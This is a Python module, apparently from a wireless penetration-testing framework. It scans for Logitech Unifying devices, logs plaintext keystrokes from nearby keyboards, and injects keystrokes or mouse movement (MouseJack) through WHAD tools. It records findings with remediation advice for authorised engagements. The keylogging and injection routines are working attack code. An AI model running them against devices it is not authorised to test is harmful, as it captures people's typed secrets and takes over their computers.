"""
Stage 10 — Logitech Unifying / MouseJack

Uses WHAD CLI tools (wuni-scan, wuni-keyboard, wuni-mouse) for all RF operations.
The dongle device is closed before each subprocess and reopened after, following
the same pattern as S5 and S7.

  sniff  — wuni-scan discovers active devices; wuni-keyboard (no -p) captures
             plaintext keystrokes from any detected keyboard
  inject — wuni-scan for discovery; wuni-keyboard -p injects text (MouseJack);
             echo | wuni-mouse injects cursor movement as fallback
"""

from __future__ import annotations

import re
import shutil
import subprocess
import threading
import time
from typing import Optional

from whad.device import WhadDevice

from core.dongle import WhadDongle
from core.models import Finding
from core.db import insert_finding
from core.logger import get_logger
import config

log = get_logger("s10_unifying")

SCAN_SECS    = config.UNIFYING_SNIFF_SECS    # passive scan window (seconds)
INJECT_SECS  = config.UNIFYING_INJECT_SECS   # pre-inject scan window (seconds)
KL_SECS      = 15                             # keylogger capture window (seconds)
SYNC_TIMEOUT = 12                             # extra seconds for keyboard sync

# wuni-scan output: [014][29:b9:81:2c:a4] 00c2a4... | Mouse (movement)
_SCAN_LINE = re.compile(r'^\s*\[\d+\]\[([0-9a-f:]+)\]\s+\S+\s+\|\s+(.+)$', re.I)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(dongle: WhadDongle, engagement_id: str, mode: str) -> None:
    """Run the Unifying stage.

    Args:
        dongle: Active WHAD dongle (device will be closed and reopened).
        engagement_id: Engagement ID for Finding storage.
        mode: "sniff" for passive discovery, "inject" for MouseJack injection.
    """
    missing = [t for t in ("wuni-scan", "wuni-keyboard", "wuni-mouse")
               if shutil.which(t) is None]
    if missing:
        log.warning(
            f"[S10] Missing CLI tools: {missing}. "
            "Install WHAD (pip install whad) to get these tools."
        )
        return

    if mode == "sniff":
        _run_sniff_mode(dongle, engagement_id)
    elif mode == "inject":
        _run_inject_mode(dongle, engagement_id)
    else:
        log.error(f"[S10] Unknown mode '{mode}' — expected 'sniff' or 'inject'.")


# ---------------------------------------------------------------------------
# Sniff sub-mode
# ---------------------------------------------------------------------------

def _run_sniff_mode(dongle: WhadDongle, engagement_id: str) -> None:
    """Passive scan then optional keylogging via wuni-scan + wuni-keyboard."""
    log.info(f"[S10][sniff] Scanning all Unifying channels for {SCAN_SECS}s ...")
    log.info("[S10][sniff] Move or type on any nearby Logitech Unifying device to detect it.")

    dongle.device.close()
    time.sleep(0.5)

    try:
        seen = _wuni_scan(SCAN_SECS)

        if not seen:
            log.info("[S10][sniff] No Unifying devices detected in scan window.")
            _print_summary(mode="sniff", discovered=0, injected=False)
            return

        log.info(f"[S10][sniff] {len(seen)} device(s) found.")

        for addr, dtype in seen.items():
            finding = Finding(
                type="unifying_device_discovered",
                severity="medium",
                target_addr=addr,
                description=(
                    f"Logitech Unifying {dtype} detected at ESB address {addr}. "
                    "Unifying devices transmit plaintext mouse events and may accept "
                    "unencrypted keystroke injection (MouseJack)."
                ),
                remediation=(
                    "Replace affected Logitech Unifying receivers with modern encrypted "
                    "Bolt receivers. Unifying receivers cannot be patched against MouseJack "
                    "at the RF layer — hardware replacement is required."
                ),
                evidence={"esb_address": addr, "device_type": dtype,
                          "scan_duration_seconds": SCAN_SECS},
                engagement_id=engagement_id,
            )
            insert_finding(finding)
            log.info(f"FINDING [medium] unifying_device_discovered: {addr} ({dtype})")

        # Keylogger pass against detected keyboard-type devices
        kbd_addrs = [a for a, t in seen.items() if t in ("keyboard", "unknown")]
        if kbd_addrs:
            log.info(f"[S10][sniff] Starting {KL_SECS}s keylogger on {kbd_addrs[0]} ...")
            keystrokes = _wuni_keyboard_log(kbd_addrs[0], KL_SECS)
            if keystrokes:
                finding = Finding(
                    type="unifying_keystrokes_captured",
                    severity="high",
                    target_addr=kbd_addrs[0],
                    description=(
                        f"Plaintext keystrokes captured from Logitech Unifying keyboard "
                        f"({kbd_addrs[0]}): {len(keystrokes)} event(s) decoded over "
                        f"{KL_SECS}s passive capture."
                    ),
                    remediation=(
                        "Replace with Logitech Bolt (AES-128 encrypted) "
                        "or a wired keyboard in sensitive areas."
                    ),
                    evidence={"esb_address": kbd_addrs[0],
                              "keystrokes_captured": len(keystrokes),
                              "sample": keystrokes[:10],
                              "capture_duration_seconds": KL_SECS},
                    engagement_id=engagement_id,
                )
                insert_finding(finding)
                log.info(
                    f"FINDING [high] unifying_keystrokes_captured: "
                    f"{kbd_addrs[0]} ({len(keystrokes)} events)"
                )
            else:
                log.info("[S10][sniff] No keystrokes decoded in capture window.")

    finally:
        _reopen_dongle(dongle)

    _print_summary(mode="sniff", discovered=len(seen), injected=False)


# ---------------------------------------------------------------------------
# Inject sub-mode (MouseJack)
# ---------------------------------------------------------------------------

def _run_inject_mode(dongle: WhadDongle, engagement_id: str) -> None:
    """MouseJack: discover devices via wuni-scan, then inject via wuni-keyboard/-mouse."""
    log.info(f"[S10][inject] Scanning for Unifying devices ({INJECT_SECS}s) ...")
    log.info("[S10][inject] Move or type on any nearby Logitech Unifying device to detect it.")

    dongle.device.close()
    time.sleep(0.5)

    seen: dict[str, str] = {}
    inject_ok = False
    method = ""

    try:
        seen = _wuni_scan(INJECT_SECS)
        target_addr = _prompt_target_address(seen)

        if not target_addr:
            log.info("[S10][inject] No target selected — injection aborted.")
            return

        log.info(f"[S10][inject] Target: {target_addr}")

        # Primary: keyboard injection
        log.info(f"[S10][inject] Attempting keyboard injection → {config.MOUSEJACK_TEXT!r}")
        if _wuni_keyboard_inject(target_addr, config.MOUSEJACK_TEXT):
            inject_ok = True
            method = "keyboard"
            log.info("[S10][inject] Keyboard injection complete.")
        else:
            log.info("[S10][inject] Keyboard injection failed — trying mouse fallback.")
            if _wuni_mouse_inject(target_addr):
                inject_ok = True
                method = "mouse"
                log.info("[S10][inject] Mouse injection complete.")
            else:
                log.warning(
                    "[S10][inject] Both injection methods failed — "
                    "device may not be in range or is immune."
                )

        if inject_ok:
            if method == "keyboard":
                finding = Finding(
                    type="mousejack_keystroke_injection",
                    severity="critical",
                    target_addr=target_addr,
                    description=(
                        f"MouseJack keystroke injection succeeded against Logitech Unifying "
                        f"receiver at {target_addr}. Arbitrary text "
                        f"({config.MOUSEJACK_TEXT!r}) was injected without authentication."
                    ),
                    remediation=(
                        "Replace Unifying receivers with Logitech Bolt (AES-128 encrypted). "
                        "No firmware update can patch MouseJack at the RF layer."
                    ),
                    evidence={"esb_address": target_addr, "injection_method": "keyboard",
                              "text_injected": config.MOUSEJACK_TEXT},
                    engagement_id=engagement_id,
                )
            else:
                finding = Finding(
                    type="mousejack_mouse_injection",
                    severity="medium",
                    target_addr=target_addr,
                    description=(
                        f"MouseJack mouse injection succeeded against Logitech Unifying "
                        f"receiver at {target_addr}. Cursor movement injected without auth."
                    ),
                    remediation="Replace Unifying receivers with Logitech Bolt.",
                    evidence={"esb_address": target_addr, "injection_method": "mouse",
                              "move_delta": "50,50"},
                    engagement_id=engagement_id,
                )
            insert_finding(finding)
            log.info(
                f"FINDING [{finding.severity}] {finding.type}: {target_addr} via {method}"
            )

    finally:
        _reopen_dongle(dongle)

    _print_summary(mode="inject", discovered=len(seen), injected=inject_ok, method=method)


# ---------------------------------------------------------------------------
# CLI subprocess helpers
# ---------------------------------------------------------------------------

def _wuni_scan(duration: float) -> dict[str, str]:
    """Run wuni-scan for `duration` seconds; return {addr: device_type} dict."""
    seen: dict[str, str] = {}
    try:
        proc = subprocess.Popen(
            ["wuni-scan", "-i", config.INTERFACE],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        timer = threading.Timer(duration, proc.terminate)
        timer.start()
        try:
            assert proc.stdout is not None
            for line in proc.stdout:
                m = _SCAN_LINE.match(line)
                if not m:
                    continue
                addr = m.group(1).lower()
                desc = m.group(2).lower()
                dtype = ("keyboard" if "key" in desc
                         else "mouse" if "mouse" in desc
                         else "unknown")
                if addr not in seen:
                    log.info(f"[S10] Unifying device: {addr} ({dtype})")
                    seen[addr] = dtype
                elif seen[addr] == "unknown" and dtype != "unknown":
                    seen[addr] = dtype
        finally:
            timer.cancel()
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
    except FileNotFoundError:
        log.warning("[S10] wuni-scan not found")
    except Exception as exc:
        log.debug(f"[S10] wuni-scan error: {exc}")

    log.info(f"[S10] Scan complete — {len(seen)} device(s) found.")
    return seen


def _wuni_keyboard_inject(address: str, text: str) -> bool:
    """Inject keystrokes via wuni-keyboard -p. Returns True on success."""
    try:
        result = subprocess.run(
            ["wuni-keyboard", "-i", config.INTERFACE, "-a", address, "-p", text],
            timeout=SYNC_TIMEOUT + 5,
            capture_output=True, text=True,
        )
        return result.returncode == 0
    except FileNotFoundError:
        log.warning("[S10] wuni-keyboard not found")
    except subprocess.TimeoutExpired:
        log.warning("[S10] wuni-keyboard inject timed out")
    except Exception as exc:
        log.debug(f"[S10] wuni-keyboard inject error: {exc}")
    return False


def _wuni_mouse_inject(address: str) -> bool:
    """Inject mouse movement via wuni-mouse stdin (X,Y,WX,WY,BUTTONS)."""
    try:
        result = subprocess.run(
            ["wuni-mouse", "-i", config.INTERFACE, "-a", address],
            input="50,50,0,0,\n",
            timeout=SYNC_TIMEOUT + 5,
            capture_output=True, text=True,
        )
        return result.returncode == 0
    except FileNotFoundError:
        log.warning("[S10] wuni-mouse not found")
    except subprocess.TimeoutExpired:
        log.warning("[S10] wuni-mouse inject timed out")
    except Exception as exc:
        log.debug(f"[S10] wuni-mouse inject error: {exc}")
    return False


def _wuni_keyboard_log(address: str, duration: float) -> list[str]:
    """Run wuni-keyboard in keylogger mode (no -p) for `duration` seconds."""
    lines: list[str] = []
    try:
        proc = subprocess.Popen(
            ["wuni-keyboard", "-i", config.INTERFACE, "-a", address],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        timer = threading.Timer(duration, proc.terminate)
        timer.start()
        try:
            assert proc.stdout is not None
            for line in proc.stdout:
                stripped = line.strip()
                if stripped:
                    lines.append(stripped)
                    log.debug(f"[S10] Keystroke: {stripped}")
        finally:
            timer.cancel()
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
    except FileNotFoundError:
        log.warning("[S10] wuni-keyboard not found")
    except Exception as exc:
        log.debug(f"[S10] wuni-keyboard log error: {exc}")
    return lines


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _prompt_target_address(seen: dict[str, str]) -> Optional[str]:
    """Show discovered devices and prompt operator to select injection target."""
    print()
    if seen:
        print("  Discovered Unifying devices:")
        addr_list = list(seen.items())
        for i, (addr, dtype) in enumerate(addr_list, 1):
            print(f"    [{i}]  {addr}  ({dtype})")
        print()
        print("  Enter number to select, or type ESB address manually.")
        print("  Leave empty to abort.")
    else:
        print("  No Unifying devices found in scan window.")
        print("  Enter ESB address manually (e.g. 29:b9:81:2c:a4) or leave empty to abort.")
    print()

    try:
        raw = input("  Target [number/address/enter to abort]: ").strip()
    except (KeyboardInterrupt, EOFError):
        return None

    if not raw:
        return None

    if raw.isdigit() and seen:
        idx = int(raw) - 1
        addr_list = list(seen.items())
        if 0 <= idx < len(addr_list):
            return addr_list[idx][0]
        print("  Invalid selection.")
        return None

    return raw.lower()


def _reopen_dongle(dongle: WhadDongle) -> None:
    """Re-create the underlying WhadDevice, polling every 0.5s up to 15s."""
    deadline = time.time() + 15.0
    last_exc: Exception | None = None
    attempt = 0
    while time.time() < deadline:
        try:
            dongle.device = WhadDevice.create(config.INTERFACE)
            return
        except Exception as exc:
            last_exc = exc
            attempt += 1
            time.sleep(0.5)
    log.warning(
        f"[S10] Could not reopen WHAD device after 15s "
        f"({type(last_exc).__name__}: {last_exc!r})"
    )


def _print_summary(mode: str, discovered: int, injected: bool, method: str = "") -> None:
    mode_label = "Sniff" if mode == "sniff" else "MouseJack Inject"
    result = "SUCCESS" if injected else ("N/A" if mode == "sniff" else "FAILED/IMMUNE")
    print("\n" + "─" * 76)
    print(f"  STAGE 10 SUMMARY -- Logitech Unifying / {mode_label}")
    print("─" * 76)
    print(f"  {'Mode':<22}: {mode_label}")
    print(f"  {'Devices discovered':<22}: {discovered}")
    if mode == "inject":
        print(f"  {'Injection result':<22}: {result}")
        if method:
            print(f"  {'Method':<22}: {method}")
    print("─" * 76 + "\n")
